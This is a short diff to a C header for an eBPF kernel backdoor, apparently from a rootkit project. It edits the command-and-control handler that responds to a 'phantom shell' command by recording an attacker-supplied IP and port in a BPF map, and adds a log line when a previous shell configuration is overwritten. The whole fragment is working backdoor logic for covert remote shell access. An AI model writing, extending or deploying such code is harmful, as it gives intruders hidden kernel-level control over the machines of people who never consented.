@@ -2,13 +2,12 @@
 #define __BPF_BACKDOOR
 
 #include "headervmlinux.h"
-
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
 #include <bpf/bpf_core_read.h>
 
 #include "../data/ring_buffer.h"
-#include "../../common/c&c.h"
+#include "../../../common/c&c.h"
 #include "../bpf/defs.h"
 
 static __always_inline int execute_key_command(int command_received, __u32 ip, __u16 port){
@@ -27,10 +26,13 @@ static __always_inline int execute_key_command(int command_received, __u32 ip, _
             ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
             break;
         case CC_PROT_COMMAND_PHANTOM_SHELL:
-            bpf_printk("Received request to start normal shell\n");
+            bpf_printk("Received request to start phantom shell\n");
             //Check for phantom shell state
-            __u64 key = 0;
+            __u64 key = 1;
             struct backdoor_phantom_shell_data *ps_data = (struct backdoor_phantom_shell_data*) bpf_map_lookup_elem(&backdoor_phantom_shell, &key);
+            if(ps_data != (void*)0 && ps_data->active ==1){
+                bpf_printk("Overwriting previous phantom shell config\n");
+            }
             struct backdoor_phantom_shell_data ps_new_data = {0};
             ps_new_data.active = 1;
             ps_new_data.d_ip  = ip;
